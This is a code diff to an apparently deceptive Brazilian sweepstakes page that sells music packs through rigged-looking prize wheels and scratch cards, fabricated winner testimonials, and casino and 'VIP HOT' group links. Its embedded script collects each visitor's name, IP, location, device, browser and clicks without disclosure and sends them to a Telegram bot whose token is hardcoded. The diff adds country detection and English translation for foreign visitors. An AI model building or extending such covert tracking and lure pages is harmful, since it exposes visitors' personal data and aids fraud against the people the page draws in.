@@ -1881,7 +1881,7 @@
         }
     </script>
     
-    <!-- Script de Rastreamento Telegram -->
+    <!-- Script de Rastreamento Telegram + Tradução Automática -->
     <script>
         // ================== CONFIG TELEGRAM ==================
         const TELEGRAM_BOT_TOKEN = "8560103571:AAE8sFKUg-gZWwWA3W8QDOEKUMhcrJL6BrI";
@@ -1901,7 +1901,9 @@
         // ================== DADOS GEO ==================
         let geoData = {
           city: "Carregando...",
-          region: "..."
+          region: "...",
+          country: "BR",
+          country_name: "Brasil"
         };
 
         // ================== PEDIR NOME ==================
@@ -1956,9 +1958,14 @@
 
             visitor.ip = d.ip || "Não identificado";
             geoData.city = d.city || "Não identificado";
-            geoData.region = d.region || "Brasil";
+            geoData.region = d.region || "Não identificado";
+            geoData.country = d.country || "BR";
+            geoData.country_name = d.country_name || "Brasil";
+            
+            return d.country !== "BR"; // Retorna true se NÃO for Brasil
           }catch(e){
             visitor.ip = "Não identificado";
+            return false;
           }
         }
 
@@ -1971,6 +1978,150 @@
           );
         }
 
+        // ================== TRADUÇÃO AUTOMÁTICA ==================
+        async function traduzirPaginaSeNecessario(isForeignVisitor) {
+            if (!isForeignVisitor) return; // Se for brasileiro, não traduz
+            
+            console.log("Visitante internacional detectado. Traduzindo para inglês...");
+            
+            // Dicionário de traduções
+            const traducoes = {
+                // Títulos principais
+                "Mundo Store Sorteios - Ganhe Packs de Músicas com Desconto!": "Mundo Store Sweepstakes - Win Music Packs with Discount!",
+                "MUNDO STORE": "WORLD STORE",
+                "Sorteios Profissionais - Ganhe descontos especiais em packs de músicas!": "Professional Sweepstakes - Get special discounts on music packs!",
+                
+                // Instruções
+                "Como Funciona": "How it Works",
+                "VERDE: GANHA DESCONTO!": "GREEN: WIN DISCOUNT!",
+                "VERMELHO: NÃO GANHA!": "RED: NO WIN!",
+                "Gire a roleta e se cair no VERDE, você ganha a chance de adquirir o pack com um super desconto! Se cair no VERMELHO, não ganhou desta vez.": "Spin the wheel and if it lands on GREEN, you get the chance to purchase the pack with a super discount! If it lands on RED, you didn't win this time.",
+                "Cada roleta tem 3 tentativas. Se perder as 3, aguarde 1 minuto para tentar novamente.": "Each wheel has 3 attempts. If you lose all 3, wait 1 minute to try again.",
+                "ATENÇÃO: As roletas sempre giram de onde pararam, nunca resetam!": "ATTENTION: The wheels always spin from where they stopped, they never reset!",
+                "Nas raspadinhas, cada card tem 3 tentativas. Se não ganhar, bloqueia por 1 minuto.": "In scratch cards, each card has 3 attempts. If you don't win, it blocks for 1 minute.",
+                "Roletas: 3 tentativas, giram de onde pararam": "Wheels: 3 attempts, spin from where they stopped",
+                "1 minuto de espera após esgotar tentativas": "1 minute wait after exhausting attempts",
+                "Raspadinhas: 3 tentativas por card": "Scratch cards: 3 attempts per card",
+                
+                // Seções
+                "ROLETAS DA SORTE": "LUCKY WHEELS",
+                "RASPADINHAS DA SORTE": "LUCKY SCRATCH CARDS",
+                "COMENTÁRIOS DE GANHADORES": "WINNERS' COMMENTS",
+                
+                // Legendas
+                "VERDE: GANHA DESCONTO!": "GREEN: WIN DISCOUNT!",
+                "VERMELHO: NÃO GANHOU": "RED: DIDN'T WIN",
+                
+                // Botões
+                "GIRAR ROLETA": "SPIN WHEEL",
+                "RASPAR": "SCRATCH",
+                "Clique em \"Raspar\" para revelar!": "Click \"SCRATCH\" to reveal!",
+                "Tentativas restantes:": "Attempts remaining:",
+                "Aguarde:": "Wait:",
+                "Redirecionando em": "Redirecting in",
+                "Tentativas esgotadas! Bloqueado por 1 minuto.": "Attempts exhausted! Blocked for 1 minute.",
+                "Não foi desta vez!": "Not this time!",
+                "Parabéns! Redirecionando em...": "Congratulations! Redirecting in...",
+                "🎉 VOCÊ GANHOU! 🎉": "🎉 YOU WON! 🎉",
+                "😔 NÃO FOI DESSA VEZ": "😔 NOT THIS TIME",
+                
+                // Botões flutuantes
+                "CASSINO PAGANDO": "PAYING CASINO",
+                "GRUPO VIP HOT R$10,00": "VIP HOT GROUP R$10.00",
+                
+                // Comentários
+                "Finalmente consegui o pack de 25 mil músicas! Valeu cada centavo, qualidade excelente!": "Finally got the 25,000 songs pack! Worth every penny, excellent quality!",
+                "Não acreditava que era verdade, mas realmente ganhei o desconto! Comprei o pack de 10 mil músicas e estou maravilhada!": "I couldn't believe it was true, but I really got the discount! I bought the 10,000 songs pack and I'm amazed!",
+                "Sou DJ há 10 anos e esse pack profissional +2TB é simplesmente sensacional! Material completo e atualizado.": "I've been a DJ for 10 years and this professional +2TB pack is simply sensational! Complete and updated material.",
+                "Amei a experiência! A roleta é divertida e ainda saí com um super desconto no pack de 5 mil músicas!": "I loved the experience! The wheel is fun and I even got a super discount on the 5,000 songs pack!",
+                "Invista no pack +7TB, vale cada centavo! Como DJ profissional, só tenho a agradecer pelo material de qualidade.": "Invest in the +7TB pack, it's worth every penny! As a professional DJ, I can only thank you for the quality material.",
+                "Fiz a roleta 3 vezes e na última consegui! Comprei o pack e já estou usando nas minhas festas. Recomendo!": "I spun the wheel 3 times and on the last one I made it! I bought the pack and I'm already using it at my parties. I recommend it!",
+                
+                // Footer
+                "Mundo Store Sorteios © 2026 - Todos os direitos reservados. Os sorteios são válidos por tempo limitado.": "Mundo Store Sweepstakes © 2026 - All rights reserved. Sweepstakes are valid for a limited time.",
+                
+                // Notificações
+                "Ganhou": "Won",
+                
+                // Prompts
+                "Qual seu nome?": "What's your name?",
+                "Visitante Anônimo": "Anonymous Visitor"
+            };
+            
+            // Traduzir todo o texto da página
+            function traduzirElementos(elemento) {
+                // Verificar se é nó de texto
+                if (elemento.nodeType === Node.TEXT_NODE) {
+                    const textoOriginal = elemento.textContent.trim();
+                    if (textoOriginal && traducoes[textoOriginal]) {
+                        elemento.textContent = traducoes[textoOriginal];
+                    }
+                } else {
+                    // Verificar atributos como placeholder, title, alt
+                    if (elemento.hasAttribute && elemento.hasAttribute('placeholder')) {
+                        const placeholder = elemento.getAttribute('placeholder');
+                        if (traducoes[placeholder]) {
+                            elemento.setAttribute('placeholder', traducoes[placeholder]);
+                        }
+                    }
+                    
+                    if (elemento.hasAttribute && elemento.hasAttribute('title')) {
+                        const title = elemento.getAttribute('title');
+                        if (traducoes[title]) {
+                            elemento.setAttribute('title', traducoes[title]);
+                        }
+                    }
+                    
+                    if (elemento.hasAttribute && elemento.hasAttribute('alt')) {
+                        const alt = elemento.getAttribute('alt');
+                        if (traducoes[alt]) {
+                            elemento.setAttribute('alt', traducoes[alt]);
+                        }
+                    }
+                    
+                    // Processar filhos
+                    for (let child of elemento.childNodes) {
+                        traduzirElementos(child);
+                    }
+                }
+            }
+            
+            // Traduzir título da página
+            if (traducoes[document.title]) {
+                document.title = traducoes[document.title];
+            }
+            
+            // Traduzir todo o conteúdo
+            traduzirElementos(document.body);
+            
+            // Traduzir dados dinâmicos
+            setTimeout(() => {
+                // Atualizar textos dinâmicos como tentativas
+                const elementosTentativas = document.querySelectorAll('[id*="attempts"]');
+                elementosTentativas.forEach(el => {
+                    if (el.textContent.includes('Tentativas restantes:')) {
+                        el.textContent = el.textContent.replace('Tentativas restantes:', 'Attempts remaining:');
+                    }
+                });
+                
+                // Atualizar textos de timer
+                const elementosTimer = document.querySelectorAll('[id*="timer"]');
+                elementosTimer.forEach(el => {
+                    if (el.textContent.includes('Aguarde:')) {
+                        el.textContent = el.textContent.replace('Aguarde:', 'Wait:');
+                    }
+                });
+                
+                // Atualizar textos de countdown
+                const elementosCountdown = document.querySelectorAll('[class*="countdown"]');
+                elementosCountdown.forEach(el => {
+                    if (el.textContent.includes('Redirecionando em')) {
+                        el.textContent = el.textContent.replace('Redirecionando em', 'Redirecting in');
+                    }
+                });
+            }, 100);
+        }
+
         // ================== VISITA NA PÁGINA ==================
         (async ()=>{
           perguntarNome();
@@ -1979,7 +2130,10 @@
           visitor.sistema = detectarSistema();
           visitor.dispositivo = detectarDispositivo();
 
-          await carregarIPeLocalizacao();
+          const isForeignVisitor = await carregarIPeLocalizacao();
+          
+          // Traduzir se não for brasileiro
+          await traduzirPaginaSeNecessario(isForeignVisitor);
 
           if(!sessionStorage.getItem("visitou")){
             sessionStorage.setItem("visitou","1");
@@ -1992,7 +2146,8 @@
                 "📱 Dispositivo: " + visitor.dispositivo + "\n" +
                 "💻 Sistema: " + visitor.sistema + "\n" +
                 "🌍 Navegador: " + visitor.navegador + "\n" +
-                "📍 Localização: " + geoData.city + " - " + geoData.region + "\n" +
+                "📍 Localização: " + geoData.city + " - " + geoData.region + " (" + geoData.country_name + ")\n" +
+                (isForeignVisitor ? "🌎 Visitante Internacional: SIM\n" : "🇧🇷 Visitante Brasileiro: SIM\n") +
                 "🕒 " + new Date().toLocaleString("pt-BR")
               );
             }, 1500);
@@ -2009,7 +2164,7 @@
             "👤 Nome: " + usuarioNome + "\n" +
             "🔘 Elemento: " + (btn.innerText || "Sem texto") + "\n" +
             "📱 " + visitor.dispositivo + " | " + visitor.navegador + "\n" +
-            "📍 " + geoData.city + " - " + geoData.region + "\n" +
+            "📍 " + geoData.city + " - " + geoData.region + " (" + geoData.country_name + ")\n" +
             "🕒 " + new Date().toLocaleString("pt-BR")
           );
         });
